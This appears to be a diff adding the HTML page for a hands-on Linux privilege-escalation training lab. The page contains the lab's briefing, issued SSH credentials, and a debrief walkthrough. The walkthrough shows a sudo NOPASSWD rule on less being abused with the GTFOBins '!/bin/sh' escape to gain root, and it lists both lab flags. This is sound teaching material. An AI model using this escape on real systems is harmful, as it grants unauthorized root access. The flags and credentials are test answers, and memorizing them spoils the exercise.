@@ -1,0 +1,237 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Atlas Mission Control — Privesc Lab 01 Borrowed Bin">
+  <title>Atlas Mission Control — Borrowed Bin</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <script src="/static/app.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas Mission Control home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>MODULE 02</span><b>LINUX PRIVILEGE ESCALATION</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+
+    <div class="workspace">
+      <aside class="rail" aria-label="Mission navigation">
+        <div class="rail-label">TRACE // 01</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="investigation"><span>02</span><i></i><em>Investigate</em></button>
+          <button data-view-target="walkthrough"><span>03</span><i></i><em>Debrief</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>PROGRESS</span><b id="progress-percent">0%</b></div>
+          <div class="progress-track"><i id="progress-bar"></i></div>
+          <small id="progress-copy">0 / 5 objectives cleared</small>
+        </div>
+      </aside>
+
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>LAB 01</span><i></i> SUDO · GTFOBINS</div>
+              <h1>BORROWED<br><em>BIN</em></h1>
+              <p>You already have a shell. The question is what that account may run as root. Ask sudo, look the binary up on GTFOBins, and take both flags. Do not guess kernel CVEs on this node.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="investigation">Begin investigation <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 20–35 MIN</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Stylized lab network map">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>OPERATOR</small></div>
+              <div class="node target-node"><i></i><span data-target>10.23.54.201</span><small>OPERATOR NODE</small></div>
+              <div class="radar-caption"><span>LIVE TOPOLOGY</span><b>TARGET ASSIGNED</b></div>
+            </div>
+          </section>
+
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">NETWORK COORDINATES</p>
+              <div class="coordinate-row"><span>TARGET HOST</span><code data-target>10.23.54.201</code></div>
+              <div class="coordinate-row"><span>SSH</span><code>k.vale / Shelf-201</code></div>
+              <div class="coordinate-row"><span>INTENDED TOOL</span><code>sudo -l + GTFOBins</code></div>
+              <div class="scope-warning"><b>!</b><span>Credentials are issued. The work starts after login.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">MISSION OBJECTIVES</p>
+              <ol>
+                <li><span>01</span>SSH in and take the user flag</li>
+                <li><span>02</span>Read sudo -l — do not guess</li>
+                <li><span>03</span>Look the binary up on GTFOBins</li>
+                <li><span>04</span>Submit the root flag</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">OPERATOR LOADOUT</p>
+              <div class="tool-row"><span class="tool-icon">S</span><span><b>SSH</b><small>k.vale@target</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">L</span><span><b>sudo -l</b><small>First command inside</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">G</span><span><b>GTFOBins</b><small>gtfobins.github.io</small></span><i>READY</i></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="investigation-layout view-enter is-hidden" data-view="investigation">
+          <section class="investigation-main">
+            <div class="view-heading">
+              <div>
+                <p class="section-label">GUIDED INVESTIGATION</p>
+                <h2>Ask sudo first.</h2>
+              </div>
+              <span id="cleared-copy">0/5 CLEARED</span>
+            </div>
+            <div class="question-stack" id="question-stack" aria-live="polite"></div>
+          </section>
+          <aside class="intel-panel">
+            <div class="intel-head"><span class="pulse-dot"></span><b>OPERATOR INTEL</b></div>
+            <div class="intel-stat"><span>LAB STATUS</span><strong id="intel-status">CONNECTING</strong></div>
+            <div class="intel-stat"><span>CURRENT PHASE</span><strong id="current-phase">01 / CONFIRM TARGET</strong></div>
+            <div class="intel-stat"><span>HINTS USED</span><strong id="hints-used">00</strong></div>
+            <div class="mini-progress"><i id="mini-progress"></i></div>
+            <p>Mission Control checks flags and findings. It never SSHes for you.</p>
+            <p class="preview-link is-hidden" id="preview-target-link">Preview mode: the operator notice is at <a href="/site/">/site/</a>. SSH is not available here.</p>
+            <button class="primary-button compact is-hidden" id="open-debrief">Open debrief →</button>
+          </aside>
+        </section>
+
+        <section class="walkthrough view-enter is-hidden" data-view="walkthrough">
+          <section class="locked-walkthrough" id="walkthrough-lock">
+            <div class="lock-orbit"><span>03</span></div>
+            <p class="section-label">DEBRIEF LOCKED</p>
+            <h2>Try the mission first.</h2>
+            <p>The walkthrough names the sudo binary, the GTFOBins recipe, and both flags. Complete the investigation, or reveal it if you are genuinely stuck.</p>
+            <div>
+              <button class="primary-button" data-view-target="investigation">Return to investigation <span>→</span></button>
+              <button class="ghost-button" id="reveal-walkthrough">Reveal full walkthrough</button>
+            </div>
+          </section>
+
+          <div class="is-hidden" id="walkthrough-content">
+            <div class="view-heading walkthrough-heading">
+              <div>
+                <p class="section-label">MISSION DEBRIEF</p>
+                <h2>sudo -l, then the manual.</h2>
+              </div>
+              <span id="walkthrough-badge" class="success-badge">MISSION COMPLETE</span>
+            </div>
+
+            <section class="debrief-summary">
+              <div><span>01</span><p>SSH</p><b>k.vale</b></div>
+              <i>→</i>
+              <div><span>02</span><p>SUDO</p><b>less</b></div>
+              <i>→</i>
+              <div><span>03</span><p>GTFO</p><b>!/bin/sh</b></div>
+              <i>→</i>
+              <div><span>04</span><p>ROOT</p><b>/root/root.txt</b></div>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">01</span>
+                <p class="section-label">LOGIN</p>
+                <h3>Credentials are on the card.</h3>
+                <p>SSH as <code>k.vale</code>. The user flag is sitting in the home directory. HTTP on this host is only a notice — it is not the path.</p>
+                <div class="explain-list">
+                  <div><code>k.vale</code><span>Issued operator</span></div>
+                  <div><code>Shelf-201</code><span>Password</span></div>
+                  <div><code>user.txt</code><span>Readable without root</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — zsh</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><span>┌──(operator㉿kali)-[~]</span><br><b>└─$</b> ssh k.vale@10.23.54.201</div>
+                  <div class="terminal-output">
+                    <div class="muted">password: Shelf-201</div>
+                    <div>k.vale@borrowed-bin:~$ cat user.txt</div>
+                    <div class="flag">LPE{borrowed_bin_shelf}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Always take user.txt before you escalate. Atlas wants both.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step reverse">
+              <div class="step-copy">
+                <span class="step-number">02</span>
+                <p class="section-label">SUDO + GTFOBINS</p>
+                <h3>Do not guess the binary.</h3>
+                <p><code>sudo -l</code> shows NOPASSWD on <code>/usr/bin/less</code> only. Open <a href="https://gtfobins.github.io/gtfobins/less/" target="_blank" rel="noopener">gtfobins.github.io/gtfobins/less</a> and use the <b>Sudo</b> function. <code>!</code> runs a shell from the pager. <code>find</code> is a different lab.</p>
+                <div class="explain-list">
+                  <div><code>sudo -l</code><span>Names the borrowed bin</span></div>
+                  <div><code>less → Sudo</code><span>GTFOBins recipe</span></div>
+                  <div><code>!/bin/sh</code><span>Root shell from the pager</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>operator node</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> sudo -l</div>
+                  <div class="terminal-output">
+                    <div class="hot">(root) NOPASSWD: /usr/bin/less</div>
+                  </div>
+                  <div class="command-line"><b>$</b> sudo less /etc/hosts</div>
+                  <div class="terminal-output">
+                    <div class="muted"># inside less, type:</div>
+                    <div>!/bin/sh</div>
+                    <div># id</div>
+                    <div class="hot">uid=0(root) gid=0(root)</div>
+                    <div># cat /root/root.txt</div>
+                    <div class="flag">LPE{borrowed_bin_root}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Shortcut that also works: sudo less /root/root.txt — still teach the shell escape.</figcaption>
+              </figure>
+            </section>
+
+            <section class="completion-card">
+              <div>
+                <span>TRACE // 01</span>
+                <h3>Bin borrowed.</h3>
+                <p>You asked sudo, you did not guess, and you used the GTFOBins Sudo function for less. Next lab has no sudo — a root cron instead.</p>
+              </div>
+              <div class="completion-stats">
+                <span><small>OBJECTIVES</small><b id="completion-objectives">05 / 05</b></span>
+                <span><small>HINTS USED</small><b id="completion-hints">00</b></span>
+              </div>
+              <button class="ghost-button" id="repeat-mission">Repeat mission</button>
+            </section>
+          </div>
+        </section>
+      </section>
+    </div>
+  </main>
+
+  <dialog class="spoiler-dialog" id="walkthrough-confirm" aria-labelledby="walkthrough-confirm-title" aria-describedby="walkthrough-confirm-copy">
+    <div class="spoiler-dialog-card">
+      <div class="spoiler-icon" aria-hidden="true">!</div>
+      <p class="section-label">SPOILER WARNING</p>
+      <h2 id="walkthrough-confirm-title">Reveal the full walkthrough?</h2>
+      <p id="walkthrough-confirm-copy">This will expose the sudo binary, the GTFOBins recipe, and both flags. Your debrief will be marked <strong>SOLUTION REVEALED</strong>.</p>
+      <div class="spoiler-dialog-actions">
+        <button class="ghost-button" id="cancel-walkthrough-reveal" type="button">Cancel — keep trying</button>
+        <button class="danger-button" id="confirm-walkthrough-reveal" type="button">Reveal anyway</button>
+      </div>
+      <small>You can still complete the investigation after revealing.</small>
+    </div>
+  </dialog>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>MISSION CONTROL OFFLINE</b><span>Start or reset the lab, then reload this page.</span></div>
+</body>
+</html>
